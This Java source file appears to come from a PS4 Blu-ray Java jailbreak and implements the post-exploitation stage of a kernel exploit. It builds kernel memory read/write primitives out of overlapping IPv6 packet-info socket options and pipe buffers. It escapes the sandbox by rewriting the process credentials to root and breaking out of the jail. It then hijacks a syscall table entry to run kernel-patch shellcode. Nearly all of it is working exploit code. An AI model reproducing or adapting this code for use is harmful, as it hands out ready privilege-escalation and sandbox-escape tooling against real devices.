package org.bdj.external;

import org.bdj.Status;
import org.bdj.api.*;

public class Kernel {
    
    private static API api;

    static {
        try {
            api = API.getInstance();
        } catch (Exception e) {
            throw new ExceptionInInitializerError(e);
        }
    }

    
    public static class KernelAddresses {
        public long evfString = 0;
        public long curproc = 0;
        public long dataBase = 0;
        public long curprocFd = 0;
        public long curprocOfiles = 0;
        public long insideKdata = 0;
        public long dmapBase = 0;
        public long kernelCr3 = 0;
        public long allproc = 0;
        public long base = 0;
        
        public boolean isInitialized() {
            return curproc != 0 && insideKdata != 0;
        }
        
        public void reset() {
            evfString = 0;
            curproc = 0;
            dataBase = 0;
            curprocFd = 0;
            curprocOfiles = 0;
            insideKdata = 0;
            dmapBase = 0;
            kernelCr3 = 0;
            allproc = 0;
            base = 0;
        }
    }

    public static KernelAddresses addr = new KernelAddresses();
    
    public interface KernelInterface {
        void copyout(long kaddr, long uaddr, int len);
        void copyin(long uaddr, long kaddr, int len);
        void readBuffer(long kaddr, Buffer buf, int len);
        void writeBuffer(long kaddr, Buffer buf, int len);
        
        long kread8(long addr);
        void kwrite8(long addr, long val);
        int kread32(long addr);
        void kwrite32(long addr, int val);
    }
    
    // Global kernel R/W instance
    public static KernelInterface kernelRW = null;
    
    // Kernel read/write primitives
    public static class KernelRW implements KernelInterface {
        private int masterSock;
        private int workerSock;
        private Buffer masterTargetBuffer;
        private Buffer slaveBuffer;
        private long curprocOfiles;
        
        // Pipe-based kernel R/W 
        private int pipeReadFd = -1;
        private int pipeWriteFd = -1;
        private long pipeAddr = 0;
        private Buffer pipemapBuffer;
        private Buffer readMem;
        private boolean pipeInitialized = false;

        public KernelRW(int masterSock, int workerSock, long curprocOfiles) {
            this.masterSock = masterSock;
            this.workerSock = workerSock;
            this.curprocOfiles = curprocOfiles;
            
            this.masterTargetBuffer = new Buffer(0x14);
            this.slaveBuffer = new Buffer(0x14);
            this.pipemapBuffer = new Buffer(0x14);
            this.readMem = new Buffer(0x1000);
        }

        public void initializePipeRW() {
            if (pipeInitialized) return;
            
            createPipePair();
            
            if (pipeReadFd > 0 && pipeWriteFd > 0) {
                pipeAddr = getFdDataAddr(pipeReadFd);
                if ((pipeAddr >>> 48) == 0xFFFF) {
                    pipeInitialized = true;
                    Status.println("Pipe-based kernel R/W initialized successfully");
                    kernelRW = this;
                } else {
                    Status.println("Invalid pipe address: " + Long.toHexString(pipeAddr));
                }
            } else {
                Status.println("Failed to create pipe pair");
            }
        }
        
        private void createPipePair() {
            Buffer fildes = new Buffer(8);
            long result = Helper.syscall(Helper.SYS_PIPE, fildes.address());
            if (result == 0) {
                pipeReadFd = fildes.getInt(0);
                pipeWriteFd = fildes.getInt(4);
                Status.println("Created pipe pair: read=" + pipeReadFd + ", write=" + pipeWriteFd);
            }
        }

        private void ipv6WriteToVictim(long kaddr) {
            masterTargetBuffer.putLong(0, kaddr);
            masterTargetBuffer.putLong(8, 0);
            masterTargetBuffer.putInt(16, 0);
            Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, masterTargetBuffer, 0x14);
        }
        
        private void ipv6KernelRead(long kaddr, Buffer bufferAddr) {
            ipv6WriteToVictim(kaddr);
            Helper.getSockOpt(workerSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, bufferAddr, 0x14);
        }

        private void ipv6KernelWrite(long kaddr, Buffer bufferAddr) {
            ipv6WriteToVictim(kaddr);
            Helper.setSockOpt(workerSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, bufferAddr, 0x14);
        }

        private long ipv6KernelRead8(long kaddr) {
            ipv6KernelRead(kaddr, slaveBuffer);
            return slaveBuffer.getLong(0);
        }
        
        private void ipv6KernelWrite8(long kaddr, long val) {
            slaveBuffer.putLong(0, val);
            slaveBuffer.putLong(8, 0);
            slaveBuffer.putInt(16, 0);
            ipv6KernelWrite(kaddr, slaveBuffer);
        }

        public void copyout(long kaddr, long uaddr, int len) {
            pipemapBuffer.putLong(0, 0x4000000040000000L);
            pipemapBuffer.putLong(8, 0x4000000000000000L);
            pipemapBuffer.putInt(16, 0);
            ipv6KernelWrite(pipeAddr, pipemapBuffer);

            pipemapBuffer.putLong(0, kaddr);
            pipemapBuffer.putLong(8, 0);
            pipemapBuffer.putInt(16, 0);
            ipv6KernelWrite(pipeAddr + 0x10, pipemapBuffer);
            
            Helper.syscall(Helper.SYS_READ, (long)pipeReadFd, uaddr, (long)len);
        }

        public void copyin(long uaddr, long kaddr, int len) {
            pipemapBuffer.putLong(0, 0);
            pipemapBuffer.putLong(8, 0x4000000000000000L);
            pipemapBuffer.putInt(16, 0);
            ipv6KernelWrite(pipeAddr, pipemapBuffer);

            pipemapBuffer.putLong(0, kaddr);
            pipemapBuffer.putLong(8, 0);
            pipemapBuffer.putInt(16, 0);
            ipv6KernelWrite(pipeAddr + 0x10, pipemapBuffer);

            Helper.syscall(Helper.SYS_WRITE, (long)pipeWriteFd, uaddr, (long)len);
        }

        public void readBuffer(long kaddr, Buffer buf, int len) {
            Buffer mem = readMem;
            copyout(kaddr, mem.address(), len);
            for (int i = 0; i < len; i++) {
                buf.putByte(i, mem.getByte(i));
            }
        }

        public void writeBuffer(long kaddr, Buffer buf, int len) {
            copyin(buf.address(), kaddr, len);
        }

        public long getFdDataAddr(int sock) {
            long filedescentAddr = curprocOfiles + sock * KernelOffset.SIZEOF_OFILES;
            long fileAddr = ipv6KernelRead8(filedescentAddr + 0x0);
            return ipv6KernelRead8(fileAddr + 0x0);
        }

        public long getSockPktopts(int sock) {
            long fdData = getFdDataAddr(sock);
            long pcb = ipv6KernelRead8(fdData + KernelOffset.SO_PCB); 
            return ipv6KernelRead8(pcb + KernelOffset.INPCB_PKTOPTS);
        }
        
        // Setup pktinfo overlap for fast R/W
        public void setupPktinfo(long workerPktopts) {
            masterTargetBuffer.putLong(0, workerPktopts + 0x10);
            masterTargetBuffer.putLong(8, 0);
            masterTargetBuffer.putInt(16, 0);
            Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, masterTargetBuffer, 0x14);
            
            // Initialize pipes immediately
            initializePipeRW();
        }
        
        public long kread8(long addr) {
            Buffer buf = new Buffer(8);
            readBuffer(addr, buf, 8);
            return buf.getLong(0);
        }
        
        public void kwrite8(long addr, long val) {
            Buffer buf = new Buffer(8);
            buf.putLong(0, val);
            writeBuffer(addr, buf, 8);
        }
        
        public int kread32(long addr) {
            Buffer buf = new Buffer(4);
            readBuffer(addr, buf, 4);
            return buf.getInt(0);
        }
        
        public void kwrite32(long addr, int val) {
            Buffer buf = new Buffer(4);
            buf.putInt(0, val);
            writeBuffer(addr, buf, 4);
        }
        
    }

    public static String readNullTerminatedString(long kaddr) {
        if (!isKernelRWAvailable()) {
            Status.println("ERROR: Kernel R/W not initialized");
            return "";
        }
        
        StringBuffer sb = new StringBuffer();
        
        while (sb.length() < 1000) {
            long value = kernelRW.kread8(kaddr);
            
            for (int i = 0; i < 8; i++) {
                byte b = (byte)((value >>> (i * 8)) & 0xFF);
                if (b == 0) {
                    return sb.toString();
                }
                if (b >= 32 && b <= 126) {
                    sb.append((char)(b & 0xFF));
                } else {
                    return sb.toString();
                }
            }
            
            kaddr += 8;
        }
        
        return sb.toString();
    }

    public static long slowKread8(int masterSock, Buffer pktinfo, int pktinfoLen, Buffer readBuf, long addr) {
        int len = 8;
        int offset = 0;

        for (int i = 0; i < len; i++) {
            readBuf.putByte(i, (byte)0);
        }

        while (offset < len) {
            pktinfo.putLong(8, addr + offset);
            Helper.setSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, pktinfo, pktinfoLen);
            
            Buffer tempBuf = new Buffer(len - offset);
            int n = Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_NEXTHOP, tempBuf, len - offset);

            if (n == 0) {
                readBuf.putByte(offset, (byte)0);
                offset++;
            } else {
                for (int i = 0; i < n; i++) {
                    readBuf.putByte(offset + i, tempBuf.getByte(i));
                }
                offset += n;
            }
        }

        return readBuf.getLong(0);
    }

    public static long getFdDataAddrSlow(int masterSock, Buffer pktinfo, int pktinfoLen, Buffer readBuf, int sock, long curprocOfiles) {
        long filedescentAddr = curprocOfiles + sock * KernelOffset.SIZEOF_OFILES;
        long fileAddr = slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, filedescentAddr + 0x0);
        return slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, fileAddr + 0x0);
    }

    public static long findProcByName(String name) {
        if (!isKernelRWAvailable()) {
            Status.println("ERROR: Kernel R/W not available");
            return 0;
        }
        
        long proc = kernelRW.kread8(addr.allproc);
        int count = 0;
        
        while (proc != 0 && count < 100) {
            String procName = readNullTerminatedString(proc + KernelOffset.PROC_COMM);
            if (name.equals(procName)) {
                return proc;
            }
            proc = kernelRW.kread8(proc + 0x0);
            count++;
        }

        return 0;
    }

    public static long findProcByPid(int pid) {
        if (!isKernelRWAvailable()) {
            Status.println("ERROR: Kernel R/W not available");
            return 0;
        }
        
        long proc = kernelRW.kread8(addr.allproc);
        int count = 0;
        
        while (proc != 0 && count < 100) {
            int procPid = kernelRW.kread32(proc + KernelOffset.PROC_PID);
            if (procPid == pid) {
                return proc;
            }
            proc = kernelRW.kread8(proc + 0x0);
            count++;
        }

        return 0;
    }

    public static long getProcCr3(long proc) {
        long vmspace = kernelRW.kread8(proc + KernelOffset.PROC_VM_SPACE);
        long pmapStore = kernelRW.kread8(vmspace + KernelOffset.VMSPACE_VM_PMAP);
        return kernelRW.kread8(pmapStore + KernelOffset.PMAP_CR3);
    }

    public static long virtToPhys(long virtAddr, long cr3) {
        if (cr3 == 0) {
            cr3 = addr.kernelCr3;
        }
        return cpuWalkPt(cr3, virtAddr);
    }

    public static long physToDmap(long physAddr) {
        return addr.dmapBase + physAddr;
    }

    // CPU page table walking
    private static final long CPU_PG_PHYS_FRAME = 0x000ffffffffff000L;
    private static final long CPU_PG_PS_FRAME = 0x000fffffffe00000L;

    private static int cpuPdeField(long pde, String field) {
        int shift = 0;
        int mask = 0;
        
        if ("PRESENT".equals(field)) { shift = 0; mask = 1; }
        else if ("RW".equals(field)) { shift = 1; mask = 1; }
        else if ("USER".equals(field)) { shift = 2; mask = 1; }
        else if ("PS".equals(field)) { shift = 7; mask = 1; }
        else if ("EXECUTE_DISABLE".equals(field)) { shift = 63; mask = 1; }
        
        return (int)((pde >>> shift) & mask);
    }

    public static long cpuWalkPt(long cr3, long vaddr) {
        long pml4eIndex = (vaddr >>> 39) & 0x1ff;
        long pdpeIndex = (vaddr >>> 30) & 0x1ff;
        long pdeIndex = (vaddr >>> 21) & 0x1ff;
        long pteIndex = (vaddr >>> 12) & 0x1ff;

        // pml4
        long pml4e = kernelRW.kread8(physToDmap(cr3) + pml4eIndex * 8);
        if (cpuPdeField(pml4e, "PRESENT") != 1) {
            return 0;
        }

        // pdp
        long pdpBasePa = pml4e & CPU_PG_PHYS_FRAME;
        long pdpeVa = physToDmap(pdpBasePa) + pdpeIndex * 8;
        long pdpe = kernelRW.kread8(pdpeVa);

        if (cpuPdeField(pdpe, "PRESENT") != 1) {
            return 0;
        }

        // pd
        long pdBasePa = pdpe & CPU_PG_PHYS_FRAME;
        long pdeVa = physToDmap(pdBasePa) + pdeIndex * 8;
        long pde = kernelRW.kread8(pdeVa);

        if (cpuPdeField(pde, "PRESENT") != 1) {
            return 0;
        }

        // large page
        if (cpuPdeField(pde, "PS") == 1) {
            return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffff);
        }

        // pt
        long ptBasePa = pde & CPU_PG_PHYS_FRAME;
        long pteVa = physToDmap(ptBasePa) + pteIndex * 8;
        long pte = kernelRW.kread8(pteVa);

        if (cpuPdeField(pte, "PRESENT") != 1) {
            return 0;
        }

        return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fff);
    }

    public static boolean postExploitationPS4() {
        Status.println("=== STAGE 5: PS4 post-exploitation ===");
        
        if (addr.curproc == 0 || addr.insideKdata == 0) {
            Status.println("ERROR: Required kernel addresses not set");
            return false;
        }

        long evfPtr = addr.insideKdata;
        Status.println("evf string @ " + Long.toHexString(evfPtr) + " = evf cv");
        
        String evfString = readNullTerminatedString(evfPtr);
        if (!"evf cv".equals(evfString)) {
            Status.println("ERROR: Failed to read EVF string - got: " + evfString);
            return false;
        }

        addr.dataBase = evfPtr - KernelOffset.getPS4Offset("EVF_OFFSET");
        Status.println("Kernel Base Candidate: " + Long.toHexString(addr.dataBase));

        if (!verifyElfHeader()) {
            return false;
        }

        if (!escapeSandbox(addr.curproc)) {
            return false;
        }
        
        applyKernelPatchesPS4();

        Status.println("PS4 post-exploitation completed successfully!");
        
        return true;
    }

    private static boolean verifyElfHeader() {
        long headerValue = kernelRW.kread8(addr.dataBase);
        
        int b0 = (int)(headerValue & 0xFF);
        int b1 = (int)((headerValue >>> 8) & 0xFF);
        int b2 = (int)((headerValue >>> 16) & 0xFF);
        int b3 = (int)((headerValue >>> 24) & 0xFF);

        Status.println("ELF header bytes at " + Long.toHexString(addr.dataBase) + ":");
        Status.println("  [0] = 0x" + Helper.toHexString(b0, 2));
        Status.println("  [1] = 0x" + Helper.toHexString(b1, 2));
        Status.println("  [2] = 0x" + Helper.toHexString(b2, 2));
        Status.println("  [3] = 0x" + Helper.toHexString(b3, 2));

        if (b0 == 0x7F && b1 == 0x45 && b2 == 0x4C && b3 == 0x46) {
            Status.println("ELF header verified KBASE is valid");
            return true;
        } else {
            Status.println("ELF header mismatch check base address");
        }
        
        return false;
    }

    private static boolean escapeSandbox(long curproc) {
        Status.println("Escaping sandbox...");
        
        if ((curproc >>> 48) != 0xFFFF) {
            Status.println("ERROR: Invalid curproc address: " + Long.toHexString(curproc));
            return false;
        }
        
        long PRISON0 = addr.dataBase + KernelOffset.getPS4Offset("PRISON0");
        long ROOTVNODE = addr.dataBase + KernelOffset.getPS4Offset("ROOTVNODE");
        long OFFSET_P_UCRED = 0x40;
        
        long procFd = kernelRW.kread8(curproc + KernelOffset.PROC_FD);
        long ucred = kernelRW.kread8(curproc + OFFSET_P_UCRED);
        
        if ((procFd >>> 48) != 0xFFFF || (ucred >>> 48) != 0xFFFF) {
            Status.println("ERROR: Invalid kernel addresses - procFd: " + Long.toHexString(procFd) + 
                          ", ucred: " + Long.toHexString(ucred));
            return false;
        }

        Status.println("Patching ucred at " + Long.toHexString(ucred));

        kernelRW.kwrite32(ucred + 0x04, 0); // cr_uid
        kernelRW.kwrite32(ucred + 0x08, 0); // cr_ruid
        kernelRW.kwrite32(ucred + 0x0C, 0); // cr_svuid
        kernelRW.kwrite32(ucred + 0x10, 1); // cr_ngroups
        kernelRW.kwrite32(ucred + 0x14, 0); // cr_rgid

        long prison0 = kernelRW.kread8(PRISON0);
        if ((prison0 >>> 48) != 0xFFFF) {
            Status.println("ERROR: Invalid prison0 address: " + Long.toHexString(prison0));
            return false;
        }
        kernelRW.kwrite8(ucred + 0x30, prison0);

        // Add JIT privileges
        kernelRW.kwrite8(ucred + 0x60, -1);
        kernelRW.kwrite8(ucred + 0x68, -1);

        long rootvnode = kernelRW.kread8(ROOTVNODE);
        if ((rootvnode >>> 48) != 0xFFFF) {
            Status.println("ERROR: Invalid rootvnode address: " + Long.toHexString(rootvnode));
            return false;
        }
        kernelRW.kwrite8(procFd + 0x10, rootvnode); // fd_rdir
        kernelRW.kwrite8(procFd + 0x18, rootvnode); // fd_jdir

        Status.println("Sandbox escape complete ... root FS access and jail broken");
        
        return true;
    }

    private static void applyKernelPatchesPS4() {
        Status.println("Applying kernel patches...");

        byte[] shellcode = KernelOffset.getKernelPatchesShellcode();
        if (shellcode.length == 0) {
            Status.println("Skipping kernel patches due to missing kernel patches shellcode.");
            return;
        }

        Status.println("File read to address: 0x0, " + shellcode.length + " bytes");

        long mappingAddr = 0x920100000L;
        long shadowMappingAddr = 0x926100000L;
        
        long sysent661Addr = addr.dataBase + KernelOffset.getPS4Offset("SYSENT_661_OFFSET");
        int syNarg = kernelRW.kread32(sysent661Addr);
        long syCall = kernelRW.kread8(sysent661Addr + 8);
        int syThrcnt = kernelRW.kread32(sysent661Addr + 0x2c);

        kernelRW.kwrite32(sysent661Addr, 2);
        kernelRW.kwrite8(sysent661Addr + 8, addr.dataBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
        kernelRW.kwrite32(sysent661Addr + 0x2c, 1);
        
        int PROT_READ = 0x1;
        int PROT_WRITE = 0x2;
        int PROT_EXEC = 0x4;
        int PROT_RW = PROT_READ | PROT_WRITE;
        int PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC;
        
        int alignedMemsz = 0x10000;
        
        // create shm with exec permission
        long execHandle = Helper.syscall(Helper.SYS_JITSHM_CREATE, 0L, (long)alignedMemsz, (long)PROT_RWX);

        // create shm alias with write permission
        long writeHandle = Helper.syscall(Helper.SYS_JITSHM_ALIAS, execHandle, (long)PROT_RW);

        // map shadow mapping and write into it
        Helper.syscall(Helper.SYS_MMAP, shadowMappingAddr, (long)alignedMemsz, (long)PROT_RW, 0x11L, writeHandle, 0L);
        
        for (int i = 0; i < shellcode.length; i++) {
            api.write8(shadowMappingAddr + i, shellcode[i]);
        }

        // map executable segment
        Helper.syscall(Helper.SYS_MMAP, mappingAddr, (long)alignedMemsz, (long)PROT_RWX, 0x11L, execHandle, 0L);
        Status.println("First bytes: 0x" + Integer.toHexString(api.read32(mappingAddr)));
        
        Helper.syscall(Helper.SYS_KEXEC, mappingAddr);
        
        Status.println("After kexec");
        
        kernelRW.kwrite32(sysent661Addr, syNarg);
        kernelRW.kwrite8(sysent661Addr + 8, syCall);
        kernelRW.kwrite32(sysent661Addr + 0x2c, syThrcnt);
        
        Helper.syscall(Helper.SYS_CLOSE, writeHandle);
        
        Status.println("Kernel patches applied successfully!");
    }
    
    public static void setKernelAddresses(long curproc, long curprocOfiles, long insideKdata, long allproc) {
        addr.curproc = curproc;
        addr.curprocOfiles = curprocOfiles;
        addr.insideKdata = insideKdata;
        addr.allproc = allproc;
        
        Status.println("Kernel addresses set:");
        Status.println("  curproc: " + Long.toHexString(addr.curproc));
        Status.println("  curprocOfiles: " + Long.toHexString(addr.curprocOfiles));
        Status.println("  insideKdata: " + Long.toHexString(addr.insideKdata));
        Status.println("  allproc: " + Long.toHexString(addr.allproc));
    }
    
    public static boolean isKernelRWAvailable() {
        return kernelRW != null && addr.isInitialized();
    }

    public static void initializeKernelOffsets() {
        KernelOffset.initializeFromHelper();
    }
}